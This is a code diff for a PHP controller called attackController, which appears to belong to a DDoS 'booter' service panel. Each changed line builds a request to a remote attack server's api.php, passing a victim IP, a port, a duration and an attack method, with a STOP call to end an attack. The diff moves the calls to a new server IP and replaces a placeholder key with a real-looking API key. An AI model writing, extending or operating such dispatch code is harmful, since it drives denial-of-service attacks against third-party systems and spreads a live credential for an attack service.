@@ -48,7 +48,7 @@ class attackController extends Controller
         // ]);
 
         $url = curl_init();
-        curl_setopt($url, CURLOPT_URL,'http://77.83.247.18/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method='.$request->method.'&key=123456');
+        curl_setopt($url, CURLOPT_URL,'http://89.171.139.72/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method='.$request->method.'&key=wyBd2fri35');
         curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
         curl_exec($url);
         curl_close($url);
@@ -63,7 +63,7 @@ class attackController extends Controller
         $attack->state = 0;
         $attack->save();
         $url = curl_init();
-        curl_setopt($url, CURLOPT_URL,'http://77.83.247.18/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method=STOP'.'&key=123456');
+        curl_setopt($url, CURLOPT_URL,'http://89.171.139.72/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method=STOP'.'&key=wyBd2fri35');
         curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
         curl_exec($url);
         curl_close($url);
